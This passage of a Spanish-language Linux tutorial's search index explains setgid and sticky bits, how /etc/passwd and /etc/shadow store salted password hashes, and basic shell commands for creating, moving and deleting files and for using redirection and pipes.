lugar de en la secci\u00f3n de propietario.</p> <p>Para establecer este bit de modo simb\u00f3lico podemos utilizar:</p> <pre><code>$ ls -l archivo2 \n-rwxr-xr-x 1 raul raul 0 Feb 2 22:35 archivo2\n$ chmod g+s archivo2\n$ ls -l archivo2\n-rwxr-sr-x 1 raul raul 0 Feb 2 22:35 archivo2\n</code></pre> <p>Y de modo absoluto, anteponiendo un dos a los permisos:</p> <pre><code>chmod 2755 archivo2\n</code></pre>"},{"location":"section/EntLinux/#bit-setgid-en-un-directorio","title":"Bit setgid en un directorio","text":"<p>Si configuramos el bit setgid en un directorio, todos los archivos y subdirectorios reci\u00e9n creados en el directorio heredar\u00e1n el grupo de ese directorio. Sin embargo, los archivos y directorios existentes no aplicar\u00e1n el cambio de grupo.</p> <p>Veamos un ejemplo para aclarar este comportamiento.</p> <p>Primero, preparamos un directorio padre que contiene dos archivos:</p> <p><pre><code>$ ls -ld padre\ndrwxrwxrwx 2 root raul 4096 Feb  3 00:33 padre/\n$ ls -l padre\ntotal 2\n-rwxr-xr-x 1 invitado invitado    0 Feb  3 00:30 existing_grp_invitado1\n-rwxr-xr-x 1 invitado invitado    0 Feb  3 00:30 existing_grp_invitado2\n</code></pre> padre es propiedad del usuario root y del grupo raul. Contiene dos archivos e invitado es due\u00f1o de ambos.</p> <p>A continuaci\u00f3n, establezcamos el bit setgid en padre usando chmod:</p> <pre><code>root# chmod g+s padre\nroot# ls -ld padre\ndrwxrwsrwx 2 root raul 4096 Feb  3 00:33 padre/\n</code></pre> <p>Ahora, vamos a crear un nuevo archivo y un subdirectorio bajo el padre con root:</p> <pre><code>root# touch padre/nuevo_root\nroot# mkdir padre/nuevo_dir_root```\n</code></pre> <p>Luego, verificaremos los propietarios del grupo de todos los archivos y subdirectorios en padre:</p> <p><pre><code>root# ls -l padre\ntotal 4\n-rwxr-xr-x 1 invitado invitado    0 Feb  3 00:30 grp_exist_invitado1\n-rwxr-xr-x 1 invitado invitado    0 Feb  3 00:30 grp_exist_invitado2\ndrwxr-sr-x 2 root  raul  4096 Feb  3 00:54 nuevo_dir_root/\n-rw-r--r-- 1 root  raul     0 Feb  3 00:54 nuevo_arch_root\n</code></pre> En la salida anterior, vemos que los dos archivos existentes no han cambiado despu\u00e9s de que establecemos el bit setuid en padre.</p> <p>Sin embargo, el archivo y el subdirectorio reci\u00e9n creados son propiedad de raul en lugar de  root , aunque root los cre\u00f3. Esto se debe a que el padre ten\u00eda establecido el bit setgid , y los archivos y directorios reci\u00e9n creados bajo \u00e9l heredaron el grupo del padre.</p>"},{"location":"section/EntLinux/#sticky-bit","title":"Sticky bit","text":"<p>La misi\u00f3n del sticky bit es proteger los archivos dentro de un directorio. Si configuramos el sticky bit en un directorio, un archivo en este directorio solo se puede eliminar mediante una de las siguientes opciones:</p> <ul> <li>El due\u00f1o del archivo</li> <li>El due\u00f1o del directorio</li> <li>El  usuario root</li> </ul> <p>En otras palabras, este permiso especial evita que un usuario elimine los archivos de otros usuarios en un directorio p\u00fablico.</p> <p>Un ejemplo t\u00edpico de sticky bit del mundo real es el directorio /tmp:</p> <p><pre><code>$ ls -ld /tmp\ndrwxrwxrwt 24 root root 980 Feb  3 21:41 /tmp/\n</code></pre> Debido a la \"w\" en la secci\u00f3n de permisos \"otros\", sabemos que cualquier usuario puede crear y eliminar cualquier archivo en el directorio /tmp .</p> <p>Pero si leemos la salida de ls anterior con atenci\u00f3n, vemos que el bit de permiso de ejecuci\u00f3n en la secci\u00f3n \"otro\" es una \"t\" min\u00fascula, en lugar de la \"x\" habitual.</p> <p>Esta \"t\" en min\u00fascula indica que el  directorio / tmp tiene el bit fijo establecido. Con el sticky bit, cualquier usuario a\u00fan puede crear archivos bajo /tmp. Sin embargo, un usuario solo puede eliminar archivos de su propiedad.</p>"},{"location":"section/EntLinux/#el-sticky-bit-en-un-directorio","title":"El sticky bit en un directorio","text":"<p>Para establecer el sticky bit en un directorio, a\u00fan podemos usar el  comando chmod con el modo + t :</p> <pre><code>chmod +t DIRECTORIO\n</code></pre> <p>De otra forma, tambi\u00e9n podemos anteponer un \"1\" al modo de un directorio para establecer el sticky bit:</p> <p><pre><code>chmod 1777 DIRECTORIO\n</code></pre> Tambi\u00e9n podemos eliminar el sticky bit de un directorio usando -t :</p> <pre><code>chmod -t DIRECTORIO\n</code></pre> <p>Como de costumbre, veamos un ejemplo para comprender c\u00f3mo el sticky bit puede proteger los archivos de un directorio y c\u00f3mo configurar y eliminar el sticky bit en un directorio.</p> <p>Comencemos por preparar un directorio p\u00fablico llamado p\u00fablico y permitir que todos los usuarios escriban en \u00e9l:</p> <pre><code>$ ls -ld public              \ndrwxrwxrwx 2 root root 40 Feb  3 22:22 public/\n</code></pre> <p>A continuaci\u00f3n, crearemos algunos archivos en p\u00fablico por diferentes usuarios:</p> <pre><code>$ ls -l\n-rw-r--r-- 1 invitado invitado 0 Feb  3 22:28 archivo1_invitado\n-rw-r--r-- 1 invitado invitado 0 Feb  3 22:28 archivo2_invitado\n-rw-r--r-- 1 raul  raul  0 Feb  3 22:28 archivo_raul\n</code></pre> <p>Hasta ahora, no hemos colocado el sticky bit en ninguna parte. Veamos si el usuario raul puede eliminar un archivo propiedad de un invitado:</p> <p><pre><code>raul$ rm archivo1_invitado \nrm: remove write-protected regular empty archivo 'archivo1_invitado'? y\nraul$ ls -l\n-rw-r--r-- 1 invitado invitado 0 Feb  3 22:28 archivo2_invitado\n-rw-r--r-- 1 raul  raul  0 Feb  3 22:28 archivo_raul\n</code></pre> Entonces, sin el sticky bit, podemos eliminar archivos propiedad de otros usuarios.</p> <p>Ahora, configuremos el sticky bit y veamos si hay alg\u00fan cambio:</p> <p><pre><code>root# chmod +t public\nroot# ls -ld public \ndrwxrwxrwt 2 root root 80 Feb  3 22:33 public/\nroot# su raul\nraul$ rm archivo2_invitado \nrm: remove write-protected regular empty archivo 'archivo2_invitado'? y\nrm: cannot remove 'archivo2_invitado': Operation not permitted\nraul$ ls -l \n-rw-r--r-- 1 invitado invitado 0 Feb 3 22:28 archivo2_invitado\n-rw-r--r-- 1 raul raul 0 Feb 3 22:28 archivo_raul\n</code></pre> Despu\u00e9s de configurar el sticky bit, los archivos en p\u00fablico solo pueden ser eliminados por los propietarios del archivo.</p>"},{"location":"section/EntLinux/#contrasenas-en-linux","title":"Contrase\u00f1as en Linux","text":"<p>En este apartado se describe c\u00f3mo se implementan las contrase\u00f1as dentro del sistema operativo Unix tanto para sistemas administrados localmente como basados \u200b\u200ben red.</p>"},{"location":"section/EntLinux/#el-archivo-etcpasswd","title":"El archivo /etc/passwd","text":"<p>Tradicionalmente, Unix usa el archivo <code>/etc/passwd</code> para realizar un seguimiento de cada usuario en el sistema. El archivo <code>/etc/passwd</code> contiene el nombre de usuario, el nombre real, la informaci\u00f3n de identificaci\u00f3n y la informaci\u00f3n b\u00e1sica de la cuenta de cada usuario. Cada l\u00ednea del archivo contiene un registro de base de datos; los campos de registro est\u00e1n separados por dos puntos (:).</p> <p>Se puede usar el comando <code>cat</code> para mostrar el archivo <code>/etc/passwd</code> del sistema. Aqu\u00ed algunas l\u00edneas de muestra de un archivo t\u00edpico:</p> <pre><code>root:x:0:1:System Operator:/:/bin/ksh\ndaemon:x:1:1::/tmp:\nuucp:x:4:4::/var/spool/uucppublic:/usr/lib/uucp/uucico\nrocio:x:181:100:Rocio Cordoba:/home/rachel:/bin/ksh\narturo:x.:182:100:Arturo Soria:/home/arlin:/bin/csh\n</code></pre> <p>Las primeras tres cuentas, root, daemon y uucp, son cuentas del sistema, mientras que roc\u00edo y arturo son cuentas para usuarios individuales.</p> <p>Alguno de los campos m\u00e1s importantes del archivo <code>/etc/passwd</code>, son:</p> Campo Contenido Roc\u00edo Nombre de usuario. x Lugar de espera para la \"contrase\u00f1a cifrada\" del usuario. Tradicionalmente, este campo almacenaba la contrase\u00f1a cifrada del usuario. Los sistemas Unix modernos almacenan contrase\u00f1as cifradas en un archivo separado (el archivo de contrase\u00f1as ocultas ) al que solo pueden acceder los usuarios privilegiados. 181 N\u00famero de identificaci\u00f3n de usuario (UID) del usuario. 100 N\u00famero de identificaci\u00f3n de grupo del usuario (GID). Rocio Cordoba Nombre completo del usuario /home/rocio Directorio de inicio del usuario. /bin/ksh Shell del usuario. <p>Las contrase\u00f1as se almacenaban tradicionalmente en el archivo /etc/passwd en un formato cifrado. Sin embargo, debido a los avances en la velocidad del procesador, las contrase\u00f1as cifradas ahora se almacenan casi universalmente en un archivo independiente, llamado /etc/shadow , que se describe m\u00e1s adelante.</p>"},{"location":"section/EntLinux/#el-sistema-de-contrasenas-cifradas-en-unixlinux","title":"El sistema de contrase\u00f1as cifradas en Unix/Linux","text":"<p>Cuando Unix/Linux solicita su contrase\u00f1a, necesita alguna forma de determinar que la contrase\u00f1a es correcta. Muchos de los primeros sistemas inform\u00e1ticos almacenaban las contrase\u00f1as de todas sus cuentas en texto plano en un archivo. En circunstancias normales, el sistema proteg\u00eda las contrase\u00f1as de modo que solo los usuarios privilegiados y las utilidades del sistema operativo pudieran acceder a ellas. Sin embargo, bien por accidente, bien por un error de programaci\u00f3n o por un acto deliberado, un usuario no privilegiado podr\u00eda acceder al contenido de este archivo. Para muestra un bot\u00f3n:</p> <p>Cita<p>Una de las situaciones m\u00e1s memorables ocurri\u00f3 a principios de la d\u00e9cada de 1960 cuando un administrador del sistema en el sistema CTSS del MIT estaba editando el archivo de contrase\u00f1as y otro administrador del sistema estaba editando el mensaje diario que se imprime en el terminal de todos al iniciar sesi\u00f3n. Debido a un error de dise\u00f1o del software, los archivos temporales del editor de los dos usuarios se intercambiaron y, por lo tanto, durante un tiempo, el archivo de contrase\u00f1a se imprimi\u00f3 en cada terminal cuando se iniciaba sesi\u00f3n.</p> </p> <p>El peligro real que planteaban estos sistemas es que los usuarios pueden hacer copias del archivo de contrase\u00f1as y robarlas sin el conocimiento del administrador del sistema.</p> <p>Unix/Linux evitan este problema al no mantener las contrase\u00f1as reales en ninguna parte del sistema. En su lugar, Unix/Linux almacenan un valor que es generado mediante el uso de la contrase\u00f1a para cifrar un bloque de bits con una funci\u00f3n unidireccional llamada crypt(); el resultado del c\u00e1lculo se almacenaba tradicionalmente en /etc/passwd. Cuando se intenta iniciar sesi\u00f3n, el programa /bin/login no descifra la contrase\u00f1a almacenada. En su lugar, /bin/login toma la contrase\u00f1a que ingres\u00f3, la usa para transformar otro bloque de ceros y compara el bloque reci\u00e9n transformado con el bloque almacenado en el archivo /etc/passwd. Si los dos resultados cifrados coinciden, el sistema lo deja entrar.</p>"},{"location":"section/EntLinux/#la-funcion-de-cifrado-tradicional-crypt","title":"La funci\u00f3n de cifrado tradicional crypt()","text":"<p>El algoritmo que usa crypt() tradicionalmente se basa en el Est\u00e1ndar de cifrado de datos (DES) del Instituto Nacional de Est\u00e1ndares y Tecnolog\u00eda (NIST). En funcionamiento normal, DES utiliza una clave de 56 bits (8 caracteres ASCII de 7 bits, por ejemplo) para cifrar bloques de texto original o texto sin cifrar, que resultaban tener 64 bits de longitud. Los bloques de 64 bits resultantes de texto cifrado o texto cifrado no se pueden descifrar f\u00e1cilmente al texto sin formato original sin conocer la clave original de 56 bits.</p> <p>Actualmente este algoritmo ha sido sustituido por unos mucho m\u00e1s seguros y robustos.</p>"},{"location":"section/EntLinux/#echandole-salt","title":"Ech\u00e1ndole \"salt\"","text":"<p>A medida que los ordenadores aumentaban de potencia y los algoritmos de cifrado fueron empezando a considerarse inseguros por ello, se inventaron nuevas formas de fortificarlos. Una de ellas fue el elemento conocido como \"salt\".</p> <p>En criptograf\u00eda, la sal (en ingl\u00e9s, salt) comprende bits aleatorios que se usan como una de las entradas en una funci\u00f3n derivadora de claves. La otra entrada es habitualmente una contrase\u00f1a. La salida de la funci\u00f3n derivadora de claves se almacena como la versi\u00f3n cifrada de la contrase\u00f1a. </p> <p>En definitiva, el salt es una cadena de caracteres aleatorios que se concatenan con la contrase\u00f1a antes de cifrarla para dificultad en gran medida su descifrado por un atacante.</p> <p>Los datos con salt complican los ataques de diccionario que cifran cada una de las entradas del mismo: cada bit de salt duplica la cantidad de almacenamiento y computaci\u00f3n requeridas. Para mayor seguridad, el valor de salt se guarda en secreto, separado de la base de datos de contrase\u00f1as. Esto aporta una gran ventaja cuando la base de datos es robada, pero la salt no. </p> <p>El beneficio aportado por usar una contrase\u00f1a con salt es que un ataque simple de diccionario contra los valores cifrados es impracticable si la salt es lo suficientemente larga.</p> <p>As\u00ed el formato del contenido del archivo /etc/shadow es:</p> <p></p> <p>El campo a la derecha del nombre de usuario indica qu\u00e9 algoritmo se ha utilizado para cifrar la contrase\u00f1a junto con el salt del tercer campo. Por curiosidad, algunos de estos algorimos son:</p> Valor Algoritmo $1$ MD5 $2a$ Blowfish $2y$ Blowfish $5$ SHA-256 $6$ SHA-512 <p>Los signos del d\u00f3lar delimitan estos dos campos.</p>"},{"location":"section/EntLinux/#principales-comandos-para-manejarse-en-el-terminal","title":"Principales comandos para manejarse en el terminal","text":""},{"location":"section/EntLinux/#crear-archivos-y-directorios","title":"Crear archivos y directorios","text":"<p>A modo de tutorial, puede ser interesante seguir los comandos que aqu\u00ed se muestran. Para ello, en primer lugar vamos a crear un subdirectorio dentro del directorio /tmp y nos ubicaremos dentro de ese subdirectorio:</p> <pre><code>mkdir /tmp/tutorial\ncd /tmp/tutorial\n</code></pre> <p>El comando mkdir es una abreviatura de \"make directory\" y se utiliza para crear nuevos directorios vac\u00edos. Permite incluso crear varios directorios en un s\u00f3lo comando utilizando el n\u00famero de par\u00e1metros o argumentos adecuado:</p> <p><pre><code>mkdir dir1 dir2 dir3\n</code></pre> Si quisi\u00e9ramos listar los directorios creados, podr\u00edamos utilizar el comando para ello:</p> <p><pre><code>ls\n</code></pre> </p> <p>Podr\u00edamos incluso darle una vuleta de tuerca al comando. Ya que los directorios que crea est\u00e1n vac\u00edos, pero si quisi\u00e9ramos crear una carpeta con subdirectorios en su interior utilizando un \u00fanico comando, har\u00edamos:</p> <p><pre><code>mkdir -p dir4/dir5/dir6\nls\n</code></pre> El \"-p\" es lo que se conoce como un switch, que no son m\u00e1s que distintas opciones para modificar el comportamiento de un comando.</p> <p>Y podr\u00edamos movernos por los subdirectorios para comprobar que, efectivamente, se han creado:</p> <pre><code>cd dir4\nls\ncd dir5\nls\ncd ../..\n</code></pre> <p>Ahora ya sabemos c\u00f3mo crear varios directorios simplemente pas\u00e1ndolos como argumentos separados al comando mkdir. Pero supongamos que queremos crear un directorio con un espacio en el nombre. Vamos a intentarlo:</p> <p><pre><code>mkdir otro directorio\nls\n</code></pre> Pod\u00e9is intentar escribir esto en el terminal o, si s\u00f3is un poco suspicaces, os habr\u00e9is dado cuenta de lo que pasar\u00e1. Exactamente, se crearan dos directorios distintos.</p> <p>Si queremos trabajar con espacios en nombres de archivos o directorios, necesitamos \"escaparlos\". \u00c9ste es un termino inform\u00e1tico que hace referencia a c\u00f3digos especiales para decirle a la m\u00e1quina que determinados caracteres y s\u00edmbolos los trate de forma diferente a lo normal. Como ejemplo:</p> <p><pre><code>mkdir \"carpeta 1\"\nmkdir 'carpeta 2'\nmkdir carpeta\\ 3\nmkdir \"carpeta 4\" \"carpeta 5\"\nmkdir -p \"carpeta 6\"/\"carpeta 7\"\nls\n</code></pre> Todos estos comandos crear\u00e1n carpetas independientes y con espacios en los nombres. Debido a lo engorroso de tener que escapar este tipo de caracteres cada vez que se utilizan en el terminal, la tendencia es usar nombres sin espacios, sustituyendo estos por guiones (\"-\") o guiones bajos (\"_\")</p>"},{"location":"section/EntLinux/#creando-archivos-usando-la-redireccion","title":"Creando archivos usando la redirecci\u00f3n","text":"<p>Supongamos que quisi\u00e9ramos capturar la salida del comando \"ls\" como un archivo de texto que podemos manipular con posterioridad. Todo lo que tenemos que hacer es agregar el car\u00e1cter mayor que (\u201d&gt;\u201d) al final de nuestra l\u00ednea de comando, seguido del nombre del archivo en el que escribir:</p> <p><pre><code>ls &gt; salida.txt\n</code></pre> No se imprimir\u00e1 nada por pantalla puesto que hemos redirigido la salida del comando al archivo salida.txt. En todo caso, podemos utilizar el comando \"cat\" para ver el contenido del archivo:</p> <pre><code>cat output.txt\n</code></pre> <p>Otro ejemplo de redirecci\u00f3n podr\u00edamos llevarlo a cabo utilizando el comando \"echo\", el cual simplemente imprime por pantalla los argumentos que recibe. Sin embargo, podr\u00edamos redirigir la salida a un archivo y crear ficheros nuevos:</p> <p><pre><code>echo \"Esto es una prueba\" &gt; test_1.txt\necho \"Esto es otra prueba\" &gt; test_2.txt\necho \"Otra prueba m\u00e1s\" &gt; test_3.txt\nls\n</code></pre> Y para ver el contenido de los archivos podemos utilizar nuevamente \"cat\". Incluso podr\u00edamos pasarle el nombre de los 3 archivos simult\u00e1nemamente como argumentos:</p> <p><pre><code>cat test_1.txt test_2.txt test_3.txt\n</code></pre> Cuando desee pasar varios nombres de archivo a un solo comando, existen algunos atajos \u00fatiles que pueden ahorrarle mucho escribir si los archivos tienen nombres similares. Se puede utilizar un signo de interrogaci\u00f3n (\"?\") Para indicar \"cualquier car\u00e1cter\" dentro del nombre del archivo. Se puede utilizar un asterisco (\u201d*\u201d) para indicar \u201ccero o m\u00e1s caracteres\u201d. A veces se los denomina caracteres \"comod\u00edn\". Un par de ejemplos pueden ayudar, los siguientes comandos hacen lo mismo:</p> <pre><code>cat test_1.txt test_2.txt test_3.txt\ncat test_?.txt\ncat test_*\n</code></pre> <p>Atenci\u00f3n<p>Precisamente por los car\u00e1cteres comod\u00edn en los comandos, tampoco es recomendable usar signos de puntuaci\u00f3n en los nombres de los archivos, de otra forma habr\u00eda que \"escapar\" estos caracteres a la hora de trabajar en la l\u00ednea de comandos con los nombres de los archivos</p> </p> <p>Observando la salida de <code>ls</code>, se puede ver que los \u00fanicos archivos o carpetas que comienzan por \"t\" son los tres archivos de prueba que acabamos de crear, por lo que incluso se podr\u00eda simplificar ese \u00faltimo comando a\u00fan m\u00e1s <code>cat t*</code>, lo que significa \"concatenar todos los archivos cuyos nombres comienzan con una t y van seguidos de cero o m\u00e1s caracteres \u201d. Usemos esta capacidad para unir todos nuestros archivos en un solo archivo nuevo y luego verlo:</p> <pre><code>cat t* &gt; combinado.txt\ncat combinado.txt\n</code></pre> <p>Hay que tener cuidado puesto que la shell borra todo el contenido del archivo antes de escribir la salida del comando <code>cat</code> en \u00e9l. Debido a esto, debe tener mucha precauci\u00f3n al usar la redirecci\u00f3n para asegurarse de no sobrescribir accidentalmente un archivo que necesita. Si lo que queremos es a\u00f1adir al final del archivo en lugar de reemplazar el contenido del mismo, debemos poner un doble s\u00edmbolo de \"mayor que\":</p> <pre><code>cat t* &gt;&gt; combinado.txt\necho \"\u00a1He a\u00f1adido una l\u00ednea!\" &gt;&gt; combinado.txt\ncat combinado.txt\n</code></pre> <p>Cuando el contenido del archivo es mayor de lo que se puede mostrar en la terminal, se necesita utilizar lo que se conoce como pager para que pagine la salida por el terminal. El pager m\u00e1s antiguo era <code>more</code> porque colocaba una l\u00ednea de texto que dec\u00eda \"--More--\" para indicar que a\u00fan hab\u00eda contenido por mostrar. </p> <p>Posteriormente surgi\u00f3 el pager <code>less</code> con el fin de reemplazar a <code>more</code>.</p> <p><pre><code>less archivo_muy_largo.txt\n</code></pre> Al examinar un archivo utilizando <code>less</code>, se pueden utilizar las teclas de flecha arriba, flecha abajo, Re P\u00e1g, Av P\u00e1g, Inicio y Fin para desplazarse a trav\u00e9s del fichero.</p>"},{"location":"section/EntLinux/#a-proposito-de-las-mayusculas-y-minusculas","title":"A prop\u00f3sito de las may\u00fasculas y min\u00fasculas","text":"<p>Los sistemas Unix son \"case sensitive\", es decir, distinguen entre may\u00fasculas y min\u00fasculas, es decir, consideran que \u201cA.txt\u201d y \u201ca.txt\u201d son dos archivos diferentes. Ejecutando los siguientes comandos se terminar\u00eda con tres archivos distintos:</p> <p><pre><code>echo \"Con minusculas\" &gt; a.txt\necho \"Con mayusculas\" &gt; A.TXT\necho \"Ambas mezcladas\" &gt; A.txt\n</code></pre> Se debe tener precauci\u00f3n con esto puesto que Windows es \"case insensitive\" y no distinguir\u00eda entre esos tres archivos, los tratar\u00eda como uno solo.</p> <p>Buenas pr\u00e1cticas de nomenclatura</p> <p>Cuando se considera tanto la distinci\u00f3n entre may\u00fasculas y min\u00fasculas como el escape, una buena regla general es mantener los nombres de los archivos en min\u00fasculas, con solo letras, n\u00fameros, guiones bajos y guiones. </p> <p>Adem\u00e1s, aunque en linux los archivos no tienen extensi\u00f3n, se la pondremos con el fin de facilitar el trabajo.</p>"},{"location":"section/EntLinux/#moviendo-y-manipulando-archivos","title":"Moviendo y manipulando archivos","text":"<p>Ahora que ya hemos aprendido a crear archivos, vemos que tareas comunes podemos realizar con ellos.</p> <p>Por ejemplo, si queremos mover nuestro archivo combinado.txt al directorio dir1, usando el comando <code>mv (move)</code>:</p> <p><pre><code>mv combinado.txt dir1\n</code></pre> Para confirmar que el comando se ha ejecutado con \u00e9xito podemos utilizar el comando <code>ls</code> para ver que el fichero ya no est\u00e1 en el directorio de trabajo, luego con  <code>cd dir1</code> cambiar a ese directorio, hacer  <code>ls</code> para ver que ahora el fichero est\u00e1 all\u00ed, y luego <code>cd ..</code> para movernos al directorio de trabajo nuevamente. </p> <p>Los dos puntos nos permiten indicarle a un comando el directorio inmediatamente superior al que estamos.  O tambi\u00e9n podemos ahorrarnos la mayor parte de este trabajo de escritura pasando una ruta directamente al comando <code>ls</code> consultar directamente el contenido de ese directorio:</p> <p><pre><code>ls dir1\n</code></pre> Si ahora quisi\u00e9ramos devolver el archivo combinado.txt al directorio padre, tendr\u00edamos dos opciones:</p> <ul> <li> <p>Entrar en <code>dir1</code> con <code>cd</code> y usar <code>mv combinado.txt ..</code>. </p> </li> <li> <p>De la misma manera que dos puntos ( ..) representan el directorio padre, por lo que .se puede usar un solo punto ( ) para representar el directorio de trabajo actual Como sabemos que solo hay un archivo en <code>dir1</code> , podemos usar \u201c*\u201d para que coincida con cualquier nombre de archivo en ese directorio, ahorr\u00e1ndonos escribir m\u00e1s comandos. Nuestro comando para mover el archivo de nuevo al directorio de trabajo se convierte en esto (se debe tener en cuenta el espacio antes del punto, ya que hay dos par\u00e1metros que se pasan a <code>mv</code>):</p> </li> </ul> <pre><code>mv dir1/* .\n</code></pre> <p>El comando <code>mv</code> nos permite mover m\u00e1s de un fichero a la vez.  Si se le pasa m\u00e1s de dos argumentos, el \u00faltimo se toma como el directorio de destino y los otros se consideran archivos (o directorios) a mover:</p> <p><pre><code>mv combinado.txt test_* dir3 dir2\nls\nls dir2\n</code></pre> Si quisi\u00e9ramos mover una vez m\u00e1s el archivo <code>combinado.txt</code> a un directorio llamado dir6, que estar\u00e1 dentro del directorio dir5, que a su vez est\u00e1 dentro del directorio dir4 y todos ellos dentro de nuestro directorio de trabajo, har\u00edamos:</p> <p><pre><code>mv dir2/combinado.txt dir4/dir5/dir6\nls dir2\nls dir4/dir5/dir6\n</code></pre> Es decir, indicando las rutas adecuadas de directorios, podremos ejecutar este tipo de comandos desde cualquier lugar en el sistema de archivos o directorios.</p> <p>Si ahora lo que quisi\u00e9ramos fuera hacer una copia del archivo <code>combinado.txt</code> en nuestro directorio de trabajo, podr\u00edamos hacer dicha copia y comprobarla con la siguiente secuencia de comandos:</p> <p><pre><code>cp dir4/dir5/dir6/combinado.txt .\nls dir4/dir5/dir6\nls\n</code></pre> Si adem\u00e1s nos vi\u00e9ramos en la necesidad de cambiarle el nombre a un archivo o carpeta, Unix interpreta este hecho como que se est\u00e1 moviendo un archivo a otro, por ello haremos uso de <code>mv</code>, como por ejemplo:</p> <p><pre><code>mv backup_combinado.txt combinado_backup.txt\nls\n</code></pre> De la misma forma, <code>mv</code> nos permite renombrar directorios:</p> <pre><code>mv \"carpeta 1\" carpeta_1\nmv \"carpeta 2\" carpeta_2\nmv \"carpeta 3\" carpeta_3\nmv \"carpeta 4\" carpeta_4\nmv \"carpeta 5\" carpeta_5\nmv \"carpeta 6\" carpeta_6\nls\n</code></pre>"},{"location":"section/EntLinux/#eliminar-archivos-y-carpetas","title":"Eliminar archivos y carpetas","text":"<p>Ahora que ya sabemos c\u00f3mo mover, copiar y renombrar archivos y directorios, \u00fanicamente nos queda saber c\u00f3mo eliminarlos. Para ello usamos el comando <code>rm</code> (remove):</p> <p><pre><code>rm dir4/dir5/dir6/combinado.txt\n</code></pre> Adem\u00e1s de archivos, se podr\u00eda intentar eliminar directorios que no hagan falta, como por ejemplo:</p> <p></p> <p>\u00a1Wow! \u00bfA qu\u00e9 se debe ese error? Pues que por motivos de seguridad o precauci\u00f3n, a pesar de que <code>rm</code> permite elminar miles de archivos con un \u00fanico comando, no permite eliminar un directorio completo. Para ello necesitaremos el comando <code>rmdir</code>:</p> <p></p> <p>A pesar que las carpetas de la 1 a la 5 se han eliminado, las 6 nos ha dado un error. Esto es porque el comando <code>mkdir</code>, una vez m\u00e1s por motivos de precacuci\u00f3n, exige que la carpeta est\u00e9 vac\u00eda para eliminarla.</p> <p>No obstante, la tarea m\u00e1s habitual cuando realmente se est\u00e1 seguro de que se desea eliminar un directorio y todo lo que contiene, es utilizar el comando <code>rm</code> de forma recursiva, usando el switch u opci\u00f3n <code>-r</code>:</p> <p></p> <p>Recordatorio: aunque <code>rm -r</code> es r\u00e1pido y eficaz, tambi\u00e9n es peligroso. Es m\u00e1s seguro eliminar archivos expl\u00edcitamente para borrar un directorio, luego <code>cd ..</code> al padre antes de usar <code>rmdir</code> para eliminarlo.</p> <p>\u00a1Peligro!<p>A diferencia de las interfaces gr\u00e1ficas, <code>rm</code> no mueve archivos a ninguna carpeta llamada \"papelera\" o similar. En cambio, los elimina total e irrevocablemente. Se debe tener mucho cuidado con los par\u00e1metros que usa con <code>rm</code> para asegurarno de que solo est\u00e1n eliminando los archivos deseados. Y se debe tener especial cuidado al usar comodines, ya que es f\u00e1cil eliminar accidentalmente m\u00e1s archivos de los que se pretend\u00eda. Un car\u00e1cter \"espacio\" equivocado en el comando puede cambiarlo por completo: <code>rm t*</code> significa \"eliminar todos los archivos que comienzan con t\", mientras que <code>rm t *</code> significa \"eliminar el archivo t as\u00ed como cualquier archivo cuyo nombre conste de cero o m\u00e1s caracteres, que ser\u00eda todo en el \u00a1directorio! Si no se est\u00e1 seguro, se puede usar la opci\u00f3n <code>-i(interactive opcional)</code> del <code>rm</code> que pedir\u00e1 que se confirme la eliminaci\u00f3n de cada archivo.</p> </p>"},{"location":"section/EntLinux/#un-poco-de-fontaneria-tuberias","title":"Un poco de fontaner\u00eda (tuber\u00edas)","text":"<p>A pesar de todos los avances t\u00e9cnicos de las \u00faltimas d\u00e9cadas, el texto sigue jugando un papel fundamental en la inform\u00e1tica. La suerte es que en Linux existen m\u00faltiples herramientas excepcionales para el manejo de texto.</p> <p>Comenzando con algo simple, \u00bfc\u00f3mo podr\u00edamos contar las l\u00edneas del archivo combinado.txt? Simple, con el comando <code>wc (word count)</code>, usando la opci\u00f3n <code>-l</code> con el fin de indicarle que \u00fanicamente queremos contar l\u00edneas:</p> <p><pre><code>wc -l combinado.txt\n</code></pre> De manera similar, si quisi\u00e9ramos saber cu\u00e1ntos archivos y carpetas hay en nuestro directorio home (~) y contarlos, podr\u00edamos hacer lo siguiente:</p> <p><pre><code>ls ~ | wc -l\n</code></pre> Esto es lo que se conoce como un pipe o tuber\u00eda. La l\u00ednea de comandos de Unix permite tomar la salida de un comando y con ella alimentar la entrada del siguiente comando. Esto es lo que conoce como canalizar los datos de un comando a otro y para ello se utiliza el car\u00e1cter \"|\".</p> <p>Los espacios alrededor del car\u00e1cter de tuber\u00eda no tienen importancia, este comando por ejemplo funcionar\u00eda perfectamente:</p> <p><pre><code>ls /etc|wc -l\n</code></pre> \u00a1Uf! Son bastantes archivos. Si quisi\u00e9ramos enumerarlos todos, claramente llenar\u00eda m\u00e1s de una pantalla. Como ya hemos visto anteriormente, cuando un comando produce una gran cantidad de resultados, es mejor usar <code>less</code> para verlo, y ese consejo a\u00fan se aplica cuando se usa una tuber\u00eda (recordad, presionad q para salir):</p> <p><pre><code>ls /etc | less\n</code></pre> Una vuelta de tuerca m\u00e1s ser\u00eda saber cu\u00e1ntas l\u00edneas sin repetir tiene el archivo <code>combinado.txt</code>, es decir, cu\u00e1ntas l\u00edneas son sin contar las repetidas. El comando que nos permite hacer esto en Unix es <code>uniq</code>:</p> <p></p> <p>Parece que se est\u00e1n eliminando muy pocas, si es que hay alguna, de nuestras l\u00edneas duplicadas. Para entender por qu\u00e9, necesitamos mirar la documentaci\u00f3n del comando.  La mayor\u00eda de las herramientas de l\u00ednea de comandos vienen con un breve (y a veces no tan breve) manual de instrucciones, se accede a trav\u00e9s del comando <code>man</code>. La salida se canaliza autom\u00e1ticamente a trav\u00e9s del paginador <code>less</code>, por lo que podremos movernos hacia adelante y hacia atr\u00e1s,presionando finalmente \"q\" cuando queramos salir:</p> <p><pre><code>man uniq\n</code></pre> </p> <p>El formato de las p\u00e1ginas de manual es a menudo conciso, se debe pensar en ellas m\u00e1s como una descripci\u00f3n general r\u00e1pida de un comando que como un tutorial completo. A menudo son muy t\u00e9cnicas, pero generalmente se puede omitir la mayor parte del contenido y simplemente buscar los detalles de la opci\u00f3n o el argumento en el que estamos interesados.</p> <p>La p\u00e1gina de manual de <code>uniq</code> es un ejemplo t\u00edpico, ya que comienza con una breve descripci\u00f3n de una l\u00ednea del comando, pasa a una sinopsis de c\u00f3mo usarlo y luego tiene una descripci\u00f3n detallada de cada opci\u00f3n o par\u00e1metro. Pero aunque las p\u00e1ginas de manual son invaluables, tambi\u00e9n pueden ser impenetrables. Se han de utilizar mejor cuando se necesita un recordatorio de un interruptor/switch/opci\u00f3n o 